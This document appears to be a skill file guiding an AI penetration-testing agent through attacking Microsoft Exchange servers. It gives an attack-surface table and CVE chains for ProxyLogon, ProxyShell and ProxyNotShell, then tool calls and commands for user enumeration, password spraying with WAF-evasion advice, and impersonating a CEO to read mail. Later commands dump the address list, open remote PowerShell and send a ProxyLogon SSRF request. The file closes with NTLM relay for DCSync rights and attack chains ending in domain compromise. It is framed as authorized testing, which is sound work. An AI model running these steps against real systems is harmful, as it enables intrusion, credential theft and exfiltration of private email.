---
name: microsoft_exchange
description: Microsoft Exchange Server security assessment — fingerprinting, CVE exploitation (ProxyLogon/ProxyShell/ProxyNotShell), EWS abuse, password spraying, Autodiscover disclosure
---

# Microsoft Exchange Security Assessment

## 1. Architecture & Attack Surface

Exchange exposes multiple HTTP services, each with distinct attack surfaces:

| Path | Service | Auth | Notes |
|------|---------|------|-------|
| `/owa/` | Outlook Web Access | Forms / NTLM | User webmail; form spray target |
| `/ecp/` | Exchange Control Panel | Forms / NTLM | Admin interface; privilege-escalation target |
| `/EWS/Exchange.asmx` | Exchange Web Services | NTLM / Basic / OAuth | SOAP API; email access, GAL enum, impersonation |
| `/autodiscover/autodiscover.xml` | Autodiscover | None (often) | Leaks internal topology without auth |
| `/Microsoft-Server-ActiveSync` | Exchange ActiveSync | Basic | Mobile sync; Basic-auth spray target |
| `/mapi/` | MAPI over HTTP | NTLM | Outlook client protocol |
| `/PowerShell/` | Remote PowerShell | NTLM / Kerberos | Exchange Management Shell; high-value post-exploit |
| `/ews/odata/` | Exchange REST API | OAuth / Basic | Exchange 2016+ |
| `/rpc/` | RPC over HTTP | NTLM | Legacy Outlook MAPI; often disabled |

---

## 2. Version Fingerprinting

Run `exchange_fingerprint` first. Version is exposed via:

- `X-OWA-Version` response header (e.g. `15.2.1118.7`)
- Build number strings in `/owa/auth/logon.aspx` JS/CSS paths

**Build → Product mapping:**

| Major | Product | Example CU |
|-------|---------|-----------|
| 15.2.x | Exchange 2019 | CU14 = 15.2.1544.4 |
| 15.1.x | Exchange 2016 | CU23 = 15.1.2507.37 |
| 15.0.x | Exchange 2013 | CU23 = 15.0.1497.48 |
| 14.x   | Exchange 2010 | SP3 RU32 |

Use build number to narrow applicable CVEs before running `exchange_check_cve`.

---

## 3. CVE Reference

### ProxyLogon (Exchange 2013–2019, unpatched before March 2021)

| CVE | Type | CVSS | Auth |
|-----|------|------|------|
| CVE-2021-26855 | SSRF → auth bypass via `X-BEResource` cookie | 9.8 | None |
| CVE-2021-27065 | Post-auth arbitrary file write via ECP | 7.8 | Low |
| CVE-2021-26857 | Unified Messaging insecure deserialization | 7.8 | Low |
| CVE-2021-26858 | Post-auth arbitrary file write | 7.8 | Low |

Chain: 26855 (SSRF bypass) → 27065 (file write) → web shell.

### ProxyShell (Exchange 2013–2019, unpatched before April–May 2021)

| CVE | Type | CVSS | Auth |
|-----|------|------|------|
| CVE-2021-34473 | ACL bypass / URL normalization SSRF | 9.8 | None |
| CVE-2021-34523 | Backend PowerShell privilege escalation | 9.0 | None |
| CVE-2021-31207 | Post-auth arbitrary file write | 6.6 | Low |

Chain: 34473 (SSRF) → 34523 (priv-esc to SYSTEM in PS backend) → 31207 (file write) → web shell.
ProxyShell is fully unauthenticated; all three CVEs are chained automatically in public PoCs.

### ProxyNotShell / OWASSRF (Exchange 2013–2019, Nov 2022)

| CVE | Type | CVSS | Auth |
|-----|------|------|------|
| CVE-2022-41040 | Authenticated SSRF (requires valid mailbox) | 8.8 | Required |
| CVE-2022-41082 | RCE via PS backend (chain with 41040) | 8.8 | Required |
| CVE-2022-41080 | ECP privilege escalation (OWASSRF — bypasses PN URL mitigations) | 8.8 | Required |

### Later RCE (Exchange 2019, early 2023)

CVE-2023-21529, CVE-2023-21706, CVE-2023-21707 — all CVSS 8.8, require valid credentials.

---

## 4. Testing Workflow

### Step 1 — Fingerprint
```
exchange_fingerprint(base_url="https://mail.example.com")
```
Confirm Exchange version, exposed endpoints, and `www-authenticate` header (NTLM / Negotiate / Basic).

### Step 2 — Autodiscover Disclosure
```
exchange_autodiscover(domain="example.com", base_url="https://mail.example.com")
```
Look for internal hostnames, IPs, and EWS URLs in XML responses. Even an unauthenticated
GET to `/autodiscover/autodiscover.xml` often returns version and topology data.

### Step 3 — CVE Scan
```
exchange_check_cve(base_url="https://mail.example.com")
```
Runs all Nuclei `exchange`-tagged templates. For targeted checks:
```
exchange_check_cve(base_url="...", cves=["CVE-2021-26855", "CVE-2021-34473"])
```

### Step 4 — User Enumeration
Use `exchange_ews_request` with `ResolveNames` — returns different SOAP faults for
valid vs. invalid users (no auth required in Exchange 2010/2013 default config):

```
exchange_ews_request(
    base_url="https://mail.example.com",
    soap_action="ResolveNames",
    soap_body='<ResolveNames xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
               ReturnFullContactData="false">
      <UnresolvedEntry>jdoe</UnresolvedEntry>
    </ResolveNames>'
)
```
`ErrorNameResolutionNoResults` → user doesn't exist.
`Resolution` element with `Mailbox` → user exists.

### Step 5 — Password Spraying
```
exchange_spray(
    base_url="https://mail.example.com",
    usernames=["user1@corp.com", "user2@corp.com"],
    passwords=["Spring2024!", "Welcome1"],
    endpoint="owa",
    delay_seconds=3.0,
)
```
Use `endpoint="ews"` for NTLM spray (harder to block at WAF level).
Use `endpoint="activesync"` when OWA is protected by WAF/ADFS but EAS is not.

⚠ Always check lockout policy before spraying. Default AD policy: 5 bad attempts in 30 min.

### Step 6 — Post-Auth EWS Enumeration
With valid credentials, use `exchange_ews_request` to:

**List all mailboxes (admin only):**
Run `Get-Mailbox` via Remote PowerShell.

**Read another user's email (requires impersonation or admin):**
```
exchange_ews_request(
    base_url="...",
    soap_action="FindFolder",
    soap_body='<FindFolder Traversal="Shallow" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <FolderShape><t:BaseShape>AllProperties</t:BaseShape></FolderShape>
      <ParentFolderIds>
        <t:DistinguishedFolderId Id="msgfolderroot"/>
      </ParentFolderIds>
    </FindFolder>',
    username="admin@corp.com",
    password="P@ssword1",
    impersonate_email="ceo@corp.com",
)
```

**Dump GAL (Global Address List):**
```
exchange_ews_request(
    soap_action="ResolveNames",
    soap_body='<ResolveNames xmlns="...messages" ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <UnresolvedEntry>smtp:</UnresolvedEntry>
    </ResolveNames>',
    username=..., password=...,
)
```

### Step 7 — Remote PowerShell (post-exploit)
If `/PowerShell/` responds (Exchange Management Shell via WinRM):
```sh
$s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://mail.example.com/PowerShell/ -Credential $cred -Authentication Kerberos
Import-PSSession $s
Get-Mailbox | Select Name,PrimarySmtpAddress
```
From the sandbox: `impacket-wmiexec` or `evil-winrm` targeting port 5985/5986.

---

## 5. ProxyLogon Manual PoC

If `exchange_check_cve` confirms CVE-2021-26855:

```sh
# Step 1: SSRF to dump admin SID (CVE-2021-26855)
curl -k -s -X POST "https://mail.example.com/ews/exchange.asmx?X-Rps-CAT=..." \
  -H "Cookie: X-BEResource=autodiscover.example.com/autodiscover/autodiscover.xml?#~1941962753" \
  -H "Content-Type: text/xml" \
  -d '<SOAP request>'

# Step 2: Authenticated file write (CVE-2021-27065)
# Use the SID obtained in step 1 to authenticate to ECP and write a web shell
```
Use public PoC scripts (e.g. `proxylogon.py`) from `/workspace` after installing via pip.

---

## 6. ProxyShell Manual PoC

```sh
# All three CVEs exploited in one chain — unauth RCE
python3 proxyshell.py -u https://mail.example.com -e user@example.com
```
Install: `pip install requests` then fetch the PoC from GitHub.

---

## 7. NTLM Relay via Exchange

Exchange endpoints (`/EWS`, `/owa`, `/autodiscover`) support NTLM, making them ideal relay targets:
1. Force authentication from Exchange server to attacker using `PrivExchange` or `Responder`
2. Relay to LDAP/LDAPS to add DCSync rights or create new privileged account

Tools: `impacket-ntlmrelayx`, `Responder`.

---

## 8. Reporting Chains

File individual findings first via `create_vulnerability_report`, then use the `vuln_chain` skill to
document combined attack scenarios such as:

- CVE-2021-26855 → CVE-2021-27065 → web shell → credential dump → domain compromise
- Valid creds (spray) → EWS impersonation → executive email exfil
- Autodiscover disclosure → internal IP mapping → pivot point for further attacks
